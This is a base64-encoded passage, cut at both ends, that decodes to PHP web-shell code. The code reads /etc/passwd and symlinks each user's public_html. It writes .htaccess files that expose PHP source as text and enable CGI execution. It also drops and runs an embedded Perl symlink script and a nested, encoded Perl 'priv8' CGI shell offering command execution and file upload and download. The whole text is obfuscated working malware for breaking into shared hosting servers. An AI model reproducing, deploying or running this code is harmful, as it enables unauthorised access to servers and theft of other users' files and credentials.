Nlc3MnLCd3Jyk7CiRmdzMgPSBmd3JpdGUoJGZwMywkZmlsZTMpOwppZiAoJGZ3MykgewoKfQplbHNlIHsKZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBObyBQZXJtIFRvIENyZWF0ZSAuaHRhY2Nlc3MgRmlsZSAhPC9mb250PjxCUj4iOwp9CkBmY2xvc2UoJGZwMyk7CiRsaW5lczM9QGZpbGUoJy9ldGMvcGFzc3dkJyk7CmlmICghJGxpbmVzMykgewokYXV0aHAgPSBAcG9wZW4oIi9iaW4vY2F0IC9ldGMvcGFzc3dkIiwgInIiKTsKJGkgPSAwOwp3aGlsZSAoIWZlb2YoJGF1dGhwKSkKJGFyZXN1bHRbJGkrK10gPSBmZ2V0cygkYXV0aHAsIDQwOTYpOwokbGluZXMzID0gJGFyZXN1bHQ7CkBwY2xvc2UoJGF1dGhwKTsKfQppZiAoISRsaW5lczMpIHsKZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBDYW4ndCBSZWFkIC9ldGMvcGFzc3dkIEZpbGUgLjwvZm9udD48QlI+IjsKZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBDYW4ndCBNYWtlIFRoZSBVc2VycyBTaG9ydGN1dHMgLjwvZm9udD48QlI+IjsKZWNobyAnPGZvbnQgY29sb3I9cmVkPlsrXSBGaW5pc2ggITwvZm9udD48QlI+JzsKfQplbHNlIHsKZm9yZWFjaCgkbGluZXMzIGFzICRsaW5lX251bTM9PiRsaW5lMyl7CiRzcHJ0Mz1leHBsb2RlKCI6IiwkbGluZTMpOwokdXNlcjM9JHNwcnQzWzBdOwpAZXhlYygnLi9sbiAtcyAvaG9tZS8nLiR1c2VyMy4nL3B1YmxpY19odG1sICcgLiAkdXNlcjMpOwp9Cn0KfQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQ5J10pKSB7CkBta2Rpcigic3ltbGlua3VzZXIiKTsKQGNoZGlyKCJzeW1saW5rdXNlciIpOwplY2hvICJDcmVhdCAuaHRhY2Nlc3MgJyBWaWV3IGxpc3QgZmlsZSAnID4+IG9rIjsKJGZpbGUzID0gJ09wdGlvbnMgYWxsIAogRGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwgCiBBZGRUeXBlIHRleHQvcGxhaW4gLnBocCAKIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIAogIEFkZFR5cGUgdGV4dC9wbGFpbiAuaHRtbCAKIEFkZEhhbmRsZXIgdHh0IC5odG1sIAogUmVxdWlyZSBOb25lIAogU2F0aXNmeSBBbnknOwokZnAzID0gZm9wZW4oJy5odGFjY2VzcycsJ3cnKTsKJGZ3MyA9IGZ3cml0ZSgkZnAzLCRmaWxlMyk7CmlmICgkZnczKSB7Cgp9CmVsc2UgewplY2hvICI8Zm9udCBjb2xvcj1yZWQ+WytdIE5vIFBlcm0gVG8gQ3JlYXRlIC5odGFjY2VzcyBGaWxlICE8L2ZvbnQ+PEJSPiI7Cn0KfQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQ4J10pKSB7CkBta2Rpcigic3ltbGlua3VzZXIiKTsKQGNoZGlyKCJzeW1saW5rdXNlciIpOwplY2hvICJDcmVhdCAuaHRhY2Nlc3MgJyBWaWV3IFdlYlNpdGUgJyA+PiBvayI7CiRmaWxlMyA9ICcnOwokZnAzID0gZm9wZW4oJy5odGFjY2VzcycsJ3cnKTsKJGZ3MyA9IGZ3cml0ZSgkZnAzLCRmaWxlMyk7CmlmICgkZnczKSB7Cgp9Cn0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0NyddKSkgewpAbWtkaXIoImFsbGNvbmZpZyIpOwpAY2hkaXIoImFsbGNvbmZpZyIpOwplY2hvICJDcmVhdCAuaHRhY2Nlc3MgJyBhbGwgY29uZmlnICcgPj4gb2siOwokZmlsZTMgPSAnT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCkRpcmVjdG9yeUluZGV4IHNzc3Nzcy5odG0KQWRkVHlwZSB0eHQgLnBocApBZGRIYW5kbGVyIHR4dCAucGhwJzsKJGZwMyA9IGZvcGVuKCcuaHRhY2Nlc3MnLCd3Jyk7CiRmdzMgPSBmd3JpdGUoJGZwMywkZmlsZTMpOwppZiAoJGZ3MykgewoKfQplbHNlIHsKZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBObyBQZXJtIFRvIENyZWF0ZSAuaHRhY2Nlc3MgRmlsZSAhPC9mb250PjxCUj4iOwp9Cn0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTInXSkpIHsKQG1rZGlyKCJzeW1saW5rdXNlciIpOwpAY2hkaXIoInN5bWxpbmt1c2VyIik7CmVjaG8gIjxpZnJhbWUgc3JjPXN5bWxpbmt1c2VyLyB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7CiRmaWxlMyA9ICdPcHRpb25zIEZvbGxvd1N5bUxpbmtzIE11bHRpVmlld3MgSW5kZXhlcyBFeGVjQ0dJCkFkZFR5cGUgYXBwbGljYXRpb24veC1odHRwZC1jZ2kgLmNpbgpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLmNpbgpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLmNpbic7CiRmcDMgPSBmb3BlbignLmh0YWNjZXNzJywndycpOwokZnczID0gZndyaXRlKCRmcDMsJGZpbGUzKTsKaWYgKCRmdzMpIHsKCn0KZWxzZSB7CmVjaG8gIjxmb250IGNvbG9yPXJlZD5bK10gTm8gUGVybSBUbyBDcmVhdGUgLmh0YWNjZXNzIEZpbGUgITwvZm9udD48QlI+IjsKfQpAZmNsb3NlKCRmcDMpOwokZmlsZVMgPSBiYXNlNjRfZGVjb2RlKCJJeUV2ZFhOeUwySnBiaTl3WlhKc0NtOXdaVzRnU1U1UVZWUXNJQ0k4TDJWMFl5OXdZWE56ZDJRaU93cDNhR2xzWlNBb0lEeEpUbEJWClZENGdLUXA3Q2lSc2FXNWxQU1JmT3lCQWMzQnlkRDF6Y0d4cGRDZ3ZPaThzSkd4cGJtVXBPeUFrZFhObGNqMGtjM0J5ZEZzd1hUc0sKYzNsemRHVnRLQ2RzYmlBdGN5QXZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd2dKeUF1SUNSMWMyVnlLVHNLZlE9PQoiKTsKJGZwUyA9IEBmb3BlbigiUEwtU3ltbGluay5jaW4iLCd3Jyk7CiRmd1MgPSBAZndyaXRlKCRmcFMsJGZpbGVTKTsKaWYgKCRmd1MpIHsKJFRFU1Q9QGZpbGUoJy9ldGMvcGFzc3dkJyk7CmlmICghJFRFU1QpIHsKZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBDYW4ndCBSZWFkIC9ldGMvcGFzc3dkIEZpbGUgLjwvZm9udD48QlI+IjsKZWNobyAiPGZvbnQgY29sb3I9cmVkPlsrXSBDYW4ndCBDcmVhdGUgVXNlcnMgU2hvcnRjdXRzIC48L2ZvbnQ+PEJSPiI7CmVjaG8gJzxmb250IGNvbG9yPXJlZD5bK10gRmluaXNoICE8L2ZvbnQ+PEJSPic7Cn0KZWxzZSB7CmNobW9kKCJQTC1TeW1saW5rLmNpbiIsMDc1NSk7CmVjaG8gQHNoZWxsX2V4ZWMoInBlcmwgUEwtU3ltbGluay5jaW4iKTsKfQpAZmNsb3NlKCRmcFMpOwp9CmVsc2UgewplY2hvICI8Zm9udCBjb2xvcj1yZWQ+WytdIE5vIFBlcm0gVG8gQ3JlYXRlIFBlcmwgRmlsZSAhPC9mb250PiI7Cn0KfQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQxMyddKSkKewpAbWtkaXIoImNnaXNoZWxsIik7CkBjaGRpcigiY2dpc2hlbGwiKTsKICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsKICAgICAgICAkZG9zeWFfYWRpID0gIiRrb2tkb3N5YSI7CiAgICAgICAgJGRvc3lhID0gZm9wZW4gKCRkb3N5YV9hZGkgLCAndycpIG9yIGRpZSAoIkRvc3lhIGHDp8SxbGFtYWTEsSEiKTsKICAgICAgICAkbWV0aW4gPSAiT3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQoKQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAuY2luCgpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLmNpbgpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLmNpbiI7ICAgIAogICAgICAgIGZ3cml0ZSAoICRkb3N5YSAsICRtZXRpbiApIDsKICAgICAgICBmY2xvc2UgKCRkb3N5YSk7CiRjZ2lzaGVsbGl6b2NpbiA9ICdJeUV2ZFhOeUwySnBiaTl3WlhKc0lDMUpMM1Z6Y2k5c2IyTmhiQzlpWVc1a2JXRnBiZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExRMEtJeUE4WWlCemRIbHNaVDBpWTI5c2IzSTZZbXhoWTJzN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvalptWm1aalkySWo1dwpjbWwyT0NCaloya2djMmhsYkd3OEwySStJQ01nYzJWeWRtVnlEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFvTkNpTXQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzBOQ2lNZ1EyOXVabWxuZFhKaGRHbHZiam9nV1c5MUlHNWxaV1FnZEc4Z1kyaGhibWRsCklHOXViSGtnSkZCaGMzTjNiM0prSUdGdVpDQWtWMmx1VGxRdUlGUm9aU0J2ZEdobGNnMEtJeUIyWVd4MVpYTWdjMmh2ZFd4a0lIZHYKY21zZ1ptbHVaU0JtYjNJZ2JXOXpkQ0J6ZVhOMFpXMXpMZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0pGQmhjM04zCmIzSmtJRDBnSW5CeWFYWTRJanNKQ1NNZ1EyaGhibWRsSUhSb2FYTXVJRmx2ZFNCM2FXeHNJRzVsWldRZ2RHOGdaVzUwWlhJZ2RHaHAKY3cwS0NRa0pDU01nZEc4Z2JHOW5hVzR1RFFvTkNpUlhhVzVPVkNBOUlEQTdDUWtKSXlCWmIzVWdibVZsWkNCMGJ5QmphR0Z1WjJVZwpkR2hsSUhaaGJIVmxJRzltSUhSb2FYTWdkRzhnTVNCcFpnMEtDUWtKQ1NNZ2VXOTFKM0psSUhKMWJtNXBibWNnZEdocGN5QnpZM0pwCmNIUWdiMjRnWVNCWGFXNWtiM2R6SUU1VURRb0pDUWtKSXlCdFlXTm9hVzVsTGlCSlppQjViM1VuY21VZ2NuVnVibWx1WnlCcGRDQnYKYmlCVmJtbDRMQ0I1YjNVTkNna0pDUWtqSUdOaGJpQnNaV0YyWlNCMGFHVWdkbUZzZFdVZ1lYTWdhWFFnYVhNdURRb05DaVJPVkVOdApaRk5sY0NBOUlDSW1JanNKQ1NNZ1ZHaHBjeUJqYUdGeVlXTjBaWElnYVhNZ2RYTmxaQ0IwYnlCelpYQmxjbUYwWlNBeUlHTnZiVzFoCmJtUnpEUW9KQ1FrSkl5QnBiaUJoSUdOdmJXMWhibVFnYkdsdVpTQnZiaUJYYVc1a2IzZHpJRTVVTGcwS0RRb2tWVzVwZUVOdFpGTmwKY0NBOUlDSTdJanNKQ1NNZ1ZHaHBjeUJqYUdGeVlXTjBaWElnYVhNZ2RYTmxaQ0IwYnlCelpYQmxjbUYwWlNBeUlHTnZiVzFoYm1SegpEUW9KQ1FrSkl5QnBiaUJoSUdOdmJXMWhibVFnYkdsdVpTQnZiaUJWYm1sNExnMEtEUW9rUTI5dGJXRnVaRlJwYldWdmRYUkVkWEpoCmRHbHZiaUE5SURFd093a2pJRlJwYldVZ2FXNGdjMlZqYjI1a2N5QmhablJsY2lCamIyMXRZVzVrY3lCM2FXeHNJR0psSUd0cGJHeGwKWkEwS0NRa0pDU01nUkc5dUozUWdjMlYwSUhSb2FYTWdkRzhnWVNCMlpYSjVJR3hoY21kbElIWmhiSFZsTGlCVWFHbHpJR2x6RFFvSgpDUWtKSXlCMWMyVm1kV3dnWm05eUlHTnZiVzFoYm1SeklIUm9ZWFFnYldGNUlHaGhibWNnYjNJZ2RHaGhkQTBLQ1FrSkNTTWdkR0ZyClpTQjJaWEo1SUd4dmJtY2dkRzhnWlhobFkzVjBaU3dnYkdsclpTQWlabWx1WkNBdklpNE5DZ2tKQ1FraklGUm9hWE1nYVhNZ2RtRnMKYVdRZ2IyNXNlU0J2YmlCVmJtbDRJSE5sY25abGNuTXVJRWwwSUdsekRRb0pDUWtKSXlCcFoyNXZjbVZrSUc5dUlFNVVJRk5sY25abApjbk11RFFvTkNpUlRhRzkzUkhsdVlXMXBZMDkxZEhCMWRDQTlJREU3Q1FraklFbG1JSFJvYVhNZ2FYTWdNU3dnZEdobGJpQmtZWFJoCklHbHpJSE5sYm5RZ2RHOGdkR2hsRFFvSkNRa0pJeUJpY205M2MyVnlJR0Z6SUhOdmIyNGdZWE1nYVhRZ2FYTWdiM1YwY0hWMExDQnYKZEdobGNuZHBjMlVOQ2drSkNRa2pJR2wwSUdseklHSjFabVpsY21Wa0lHRnVaQ0J6Wlc1a0lIZG9aVzRnZEdobElHTnZiVzFoYm1RTgpDZ2tKQ1FraklHTnZiWEJzWlhSbGN5NGdWR2hwY3lCcGN5QjFjMlZtZFd3Z1ptOXlJR052YlcxaGJtUnpJR3hwYTJVTkNna0pDUWtqCklIQnBibWNzSUhOdklIUm9ZWFFnZVc5MUlHTmhiaUJ6WldVZ2RHaGxJRzkxZEhCMWRDQmhjeUJwZEEwS0NRa0pDU01nYVhNZ1ltVnAKYm1jZ1oyVnVaWEpoZEdWa0xnMEtEUW9qSUVSUFRpZFVJRU5JUVU1SFJTQkJUbGxVU0VsT1J5QkNSVXhQVnlCVVNFbFRJRXhKVGtVZwpWVTVNUlZOVElGbFBWU0JMVGs5WElGZElRVlFnV1U5VkoxSkZJRVJQU1U1SElDRWhEUW9OQ2lSRGJXUlRaWEFnUFNBb0pGZHBiazVVCklEOGdKRTVVUTIxa1UyVndJRG9nSkZWdWFYaERiV1JUWlhBcE93MEtKRU50WkZCM1pDQTlJQ2drVjJsdVRsUWdQeUFpWTJRaUlEb2cKSW5CM1pDSXBPdzBLSkZCaGRHaFRaWEFnUFNBb0pGZHBiazVVSUQ4Z0lseGNJaUE2SUNJdklpazdEUW9rVW1Wa2FYSmxZM1J2Y2lBOQpJQ2drVjJsdVRsUWdQeUFpSURJK0pqRWdNVDRtTWlJZ09pQWlJREUrSmpFZ01qNG1NU0lwT3cwS0RRb2pMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0RFFvaklGSmxZV1J6SUhSb1pTQnBibkIxZENCelpXNTBJR0o1SUhSb1pTQmljbTkzYzJWeUlHRnVaQ0J3WVhKegpaWE1nZEdobElHbHVjSFYwSUhaaGNtbGhZbXhsY3k0Z1NYUU5DaU1nY0dGeWMyVnpJRWRGVkN3Z1VFOVRWQ0JoYm1RZ2JYVnNkR2x3CllYSjBMMlp2Y20wdFpHRjBZU0IwYUdGMElHbHpJSFZ6WldRZ1ptOXlJSFZ3Ykc5aFpHbHVaeUJtYVd4bGN5NE5DaU1nVkdobElHWnAKYkdWdVlXMWxJR2x6SUhOMGIzSmxaQ0JwYmlBa2FXNTdKMlluZlNCaGJtUWdkR2hsSUdSaGRHRWdhWE1nYzNSdmNtVmtJR2x1SUNScApibnNuWm1sc1pXUmhkR0VuZlM0TkNpTWdUM1JvWlhJZ2RtRnlhV0ZpYkdWeklHTmhiaUJpWlNCaFkyTmxjM05sWkNCMWMybHVaeUFrCmFXNTdKM1poY2lkOUxDQjNhR1Z5WlNCMllYSWdhWE1nZEdobElHNWhiV1VnYjJZTkNpTWdkR2hsSUhaaGNtbGhZbXhsTGlCT2IzUmwKT2lCTmIzTjBJRzltSUhSb1pTQmpiMlJsSUdsdUlIUm9hWE1nWm5WdVkzUnBiMjRnYVhNZ2RHRnJaVzRnWm5KdmJTQnZkR2hsY2lCRApSMGtOQ2lNZ2MyTnlhWEIwY3k0TkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5Dbk4xWWlCU1pXRmtVR0Z5YzJVZ0RRcDcKRFFvSmJHOWpZV3dnS0NwcGJpa2dQU0JBWHlCcFppQkFYenNOQ2dsc2IyTmhiQ0FvSkdrc0lDUnNiMk1zSUNSclpYa3NJQ1IyWVd3cApPdzBLQ1EwS0NTUk5kV3gwYVhCaGNuUkdiM0p0UkdGMFlTQTlJQ1JGVGxaN0owTlBUbFJGVGxSZlZGbFFSU2Q5SUQxK0lDOXRkV3gwCmFYQmhjblJjTDJadmNtMHRaR0YwWVRzZ1ltOTFibVJoY25rOUtDNHJLU1F2T3cwS0RRb0phV1lvSkVWT1Zuc25Va1ZSVlVWVFZGOU4KUlZSSVQwUW5mU0JsY1NBaVIwVlVJaWtOQ2dsN0RRb0pDU1JwYmlBOUlDUkZUbFo3SjFGVlJWSlpYMU5VVWtsT1J5ZDlPdzBLQ1gwTgpDZ2xsYkhOcFppZ2tSVTVXZXlkU1JWRlZSVk5VWDAxRlZFaFBSQ2Q5SUdWeElDSlFUMU5VSWlrTkNnbDdEUW9KQ1dKcGJtMXZaR1VvClUxUkVTVTRwSUdsbUlDUk5kV3gwYVhCaGNuUkdiM0p0UkdGMFlTQW1JQ1JYYVc1T1ZEc05DZ2tKY21WaFpDaFRWRVJKVGl3Z0pHbHUKTENBa1JVNVdleWREVDA1VVJVNVVYMHhGVGtkVVNDZDlLVHNOQ2dsOURRb05DZ2tqSUdoaGJtUnNaU0JtYVd4bElIVndiRzloWkNCawpZWFJoRFFvSmFXWW9KRVZPVm5zblEwOU9WRVZPVkY5VVdWQkZKMzBnUFg0Z0wyMTFiSFJwY0dGeWRGd3ZabTl5YlMxa1lYUmhPeUJpCmIzVnVaR0Z5ZVQwb0xpc3BKQzhwRFFvSmV3MEtDUWtrUW05MWJtUmhjbmtnUFNBbkxTMG5MaVF4T3lBaklIQnNaV0Z6WlNCeVpXWmwKY2lCMGJ5QlNSa014T0RZM0lBMEtDUWxBYkdsemRDQTlJSE53YkdsMEtDOGtRbTkxYm1SaGNua3ZMQ0FrYVc0cE95QU5DZ2tKSkVobApZV1JsY2tKdlpIa2dQU0FrYkdsemRGc3hYVHNOQ2drSkpFaGxZV1JsY2tKdlpIa2dQWDRnTDF4eVhHNWNjbHh1ZkZ4dVhHNHZPdzBLCkNRa2tTR1ZoWkdWeUlEMGdKR0E3RFFvSkNTUkNiMlI1SUQwZ0pDYzdEUW9nQ1Fra1FtOWtlU0E5ZmlCekwxeHlYRzRrTHk4N0lDTWcKZEdobElHeGhjM1FnWEhKY2JpQjNZWE1nY0hWMElHbHVJR0o1SUU1bGRITmpZWEJsRFFvSkNTUnBibnNuWm1sc1pXUmhkR0VuZlNBOQpJQ1JDYjJSNU93MEtDUWtrU0dWaFpHVnlJRDErSUM5bWFXeGxibUZ0WlQxY0lpZ3VLeWxjSWk4N0lBMEtDUWtrYVc1N0oyWW5mU0E5CklDUXhPeUFOQ2drSkpHbHVleWRtSjMwZ1BYNGdjeTljSWk4dlp6c05DZ2tKSkdsdWV5ZG1KMzBnUFg0Z2N5OWNjeTh2WnpzTkNnMEsKQ1FraklIQmhjbk5sSUhSeVlXbHNaWElOQ2drSlptOXlLQ1JwUFRJN0lDUnNhWE4wV3lScFhUc2dKR2tyS3lrTkNna0pleUFOQ2drSgpDU1JzYVhOMFd5UnBYU0E5ZmlCekwxNHVLMjVoYldVOUpDOHZPdzBLQ1FrSkpHeHBjM1JiSkdsZElEMStJQzljSWloY2R5c3BYQ0l2Ck93MEtDUWtKSkd0bGVTQTlJQ1F4T3cwS0NRa0pKSFpoYkNBOUlDUW5PdzBLQ1FrSkpIWmhiQ0E5ZmlCekx5aGVLRnh5WEc1Y2NseHUKZkZ4dVhHNHBLWHdvWEhKY2JpUjhYRzRrS1M4dlp6c05DZ2tKQ1NSMllXd2dQWDRnY3k4bEtDNHVLUzl3WVdOcktDSmpJaXdnYUdWNApLQ1F4S1NrdloyVTdEUW9KQ1Fra2FXNTdKR3RsZVgwZ1BTQWtkbUZzT3lBTkNna0pmUTBLQ1gwTkNnbGxiSE5sSUNNZ2MzUmhibVJoCmNtUWdjRzl6ZENCa1lYUmhJQ2gxY213Z1pXNWpiMlJsWkN3Z2JtOTBJRzExYkhScGNHRnlkQ2tOQ2dsN0RRb0pDVUJwYmlBOUlITncKYkdsMEtDOG1MeXdnSkdsdUtUc05DZ2tKWm05eVpXRmphQ0FrYVNBb01DQXVMaUFrSTJsdUtRMEtDUWw3RFFvSkNRa2thVzViSkdsZApJRDErSUhNdlhDc3ZJQzluT3cwS0NRa0pLQ1JyWlhrc0lDUjJZV3dwSUQwZ2MzQnNhWFFvTHowdkxDQWthVzViSkdsZExDQXlLVHNOCkNna0pDU1JyWlhrZ1BYNGdjeThsS0M0dUtTOXdZV05yS0NKaklpd2dhR1Y0S0NReEtTa3ZaMlU3RFFvSkNRa2tkbUZzSUQxK0lITXYKSlNndUxpa3ZjR0ZqYXlnaVl5SXNJR2hsZUNna01Ta3BMMmRsT3cwS0NRa0pKR2x1ZXlSclpYbDlJQzQ5SUNKY01DSWdhV1lnS0dSbApabWx1WldRb0pHbHVleVJyWlhsOUtTazdEUW9KQ1Fra2FXNTdKR3RsZVgwZ0xqMGdKSFpoYkRzTkNna0pmUTBLQ1gwTkNuME5DZzBLCkl5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJRY21sdWRITWdkR2hsSUVoVVRVd2dVR0ZuWlNCSVpXRmtaWElOQ2lNZwpRWEpuZFcxbGJuUWdNVG9nUm05eWJTQnBkR1Z0SUc1aGJXVWdkRzhnZDJocFkyZ2dabTlqZFhNZ2MyaHZkV3hrSUdKbElITmxkQTBLCkl5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtjM1ZpSUZCeWFXNTBVR0ZuWlVobFlXUmxjZzBLZXcwS0NTUkZibU52WkdWawpRM1Z5Y21WdWRFUnBjaUE5SUNSRGRYSnlaVzUwUkdseU93MEtDU1JGYm1OdlpHVmtRM1Z5Y21WdWRFUnBjaUE5ZmlCekx5aGJYbUV0CmVrRXRXakF0T1YwcEx5Y2xKeTUxYm5CaFkyc29Ja2dxSWl3a01Ta3ZaV2M3RFFvSmNISnBiblFnSWtOdmJuUmxiblF0ZEhsd1pUb2cKZEdWNGRDOW9kRzFzWEc1Y2JpSTdEUW9KY0hKcGJuUWdQRHhGVGtRN0RRbzhhSFJ0YkQ0TkNqeG9aV0ZrUGcwS1BIUnBkR3hsUG5CeQphWFk0SUdObmFTQnphR1ZzYkR3dmRHbDBiR1UrRFFva1NIUnRiRTFsZEdGSVpXRmtaWElOQ2cwS1BHMWxkR0VnYm1GdFpUMGlhMlY1CmQyOXlaSE1pSUdOdmJuUmxiblE5SW5CeWFYWTRJR05uYVNCemFHVnNiQ0FnWHlBZ0lDQWdhVFZmUUdodmRHMWhhV3d1WTI5dElqNE4KQ2p4dFpYUmhJRzVoYldVOUltUmxjMk55YVhCMGFXOXVJaUJqYjI1MFpXNTBQU0p3Y21sMk9DQmpaMmtnYzJobGJHd2dJRjhnSUNBZwphVFZmUUdodmRHMWhhV3d1WTI5dElqNE5Dand2YUdWaFpENE5DanhpYjJSNUlHOXVURzloWkQwaVpHOWpkVzFsYm5RdVppNUFYeTVtCmIyTjFjeWdwSWlCaVoyTnZiRzl5UFNJalJrWkdSa1pHSWlCMGIzQnRZWEpuYVc0OUlqQWlJR3hsWm5SdFlYSm5hVzQ5SWpBaUlHMWgKY21kcGJuZHBaSFJvUFNJd0lpQnRZWEpuYVc1b1pXbG5hSFE5SWpBaUlIUmxlSFE5SWlOR1JqQXdNREFpUGcwS1BIUmhZbXhsSUdKdgpjbVJsY2owaU1TSWdkMmxrZEdnOUlqRXdNQ1VpSUdObGJHeHpjR0ZqYVc1blBTSXdJaUJqWld4c2NHRmtaR2x1WnowaU1pSStEUW84CmRISStEUW84ZEdRZ1ltZGpiMnh2Y2owaUkwWkdSa1pHUmlJZ1ltOXlaR1Z5WTI5c2IzSTlJaU5HUmtaR1JrWWlJR0ZzYVdkdVBTSmoKWlc1MFpYSWlJSGRwWkhSb1BTSXhKU0krRFFvOFlqNDhabTl1ZENCemFYcGxQU0l5SWo0alBDOW1iMjUwUGp3dllqNDhMM1JrUGcwSwpQSFJrSUdKblkyOXNiM0k5SWlOR1JrWkdSa1lpSUhkcFpIUm9QU0k1T0NVaVBqeG1iMjUwSUdaaFkyVTlJbFpsY21SaGJtRWlJSE5wCmVtVTlJaklpUGp4aVBpQU5DanhpSUhOMGVXeGxQU0pqYjJ4dmNqcGliR0ZqYXp0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lObVptWm0KTmpZaVBuQnlhWFk0SUdObmFTQnphR1ZzYkR3dllqNGdRMjl1Ym1WamRHVmtJSFJ2SUNSVFpYSjJaWEpPWVcxbFBDOWlQand2Wm05dQpkRDQ4TDNSa1BnMEtQQzkwY2o0TkNqeDBjajROQ2p4MFpDQmpiMnh6Y0dGdVBTSXlJaUJpWjJOdmJHOXlQU0lqUmtaR1JrWkdJajQ4ClptOXVkQ0JtWVdObFBTSldaWEprWVc1aElpQnphWHBsUFNJeUlqNE5DZzBLUEdFZ2FISmxaajBpSkZOamNtbHdkRXh2WTJGMGFXOXUKUDJFOWRYQnNiMkZrSm1ROUpFVnVZMjlrWldSRGRYSnlaVzUwUkdseUlqNDhabTl1ZENCamIyeHZjajBpSTBaR01EQXdNQ0krVlhCcwpiMkZrSUVacGJHVThMMlp2Ym5RK1BDOWhQaUI4SUEwS1BHRWdhSEpsWmowaUpGTmpjbWx3ZEV4dlkyRjBhVzl1UDJFOVpHOTNibXh2CllXUW1aRDBrUlc1amIyUmxaRU4xY25KbGJuUkVhWElpUGp4bWIyNTBJR052Ykc5eVBTSWpSa1l3TURBd0lqNUViM2R1Ykc5aFpDQkcKYVd4bFBDOW1iMjUwUGp3dllUNGdmQTBLUEdFZ2FISmxaajBpSkZOamNtbHdkRXh2WTJGMGFXOXVQMkU5Ykc5bmIzVjBJajQ4Wm05dQpkQ0JqYjJ4dmNqMGlJMFpHTURBd01DSStSR2x6WTI5dWJtVmpkRHd2Wm05dWRENDhMMkUrSUh3TkNqd3ZabTl1ZEQ0OEwzUmtQZzBLClBDOTBjajROQ2p3dmRHRmliR1UrRFFvOFptOXVkQ0J6YVhwbFBTSXpJajROQ2tWT1JBMEtmUTBLRFFvakxTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHREUW9qSUZCeWFXNTBjeUIwYUdVZ1RHOW5hVzRnVTJOeVpXVnVEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdERRcHpkV0lnVUhKcGJuUk1iMmRwYmxOamNtVmxiZzBLZXcwS0NTUk5aWE56WVdkbElEMGdjU1E4TDJadmJuUStQR2d4UG5CaApjM005Y0hKcGRqZzhMMmd4UGp4bWIyNTBJR052Ykc5eVBTSWpNREE1T1RBd0lpQnphWHBsUFNJeklqNDhjSEpsUGp4cGJXY2dZbTl5ClpHVnlQU0l3SWlCemNtTTlJbWgwZEhBNkx5OTNkM2N1Y0hKcGRqZ3VhV0pzYjJkblpYSXViM0puTDNNdWNHaHdQeXRqWjJsMFpXeHUKWlhRZ2MyaGxiR3dpSUhkcFpIUm9QU0l3SWlCb1pXbG5hSFE5SWpBaVBqd3ZjSEpsUGcwS0pEc05DaU1uRFFvSmNISnBiblFnUER4RgpUa1E3RFFvOFkyOWtaVD